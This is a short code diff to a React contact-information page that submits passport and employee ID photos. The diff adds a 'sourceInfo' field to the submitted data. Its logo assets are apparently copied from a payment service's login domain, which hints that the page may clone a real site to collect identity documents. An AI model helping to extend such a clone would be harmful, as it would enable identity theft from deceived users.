@@ -8,6 +8,7 @@ import { SEO } from '@/components/SEO';
 import { useToast } from '@/hooks/use-toast';
 import { useMutation } from '@tanstack/react-query';
 import { apiRequest } from '@/lib/queryClient';
+import { getSourceInfo } from '@/lib/sourceInfo';
 import '@/styles/styles.css';
 import logoSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
 import contactIconSvg from '@assets/extracted/login.mypaymentvault.com/paymentvault_logo.svg';
@@ -176,6 +177,7 @@ export default function ContactInfoPage() {
         ...data,
         passportPhoto,
         employeeIdPhoto,
+        sourceInfo: getSourceInfo(),
       });
       
       return data.email;
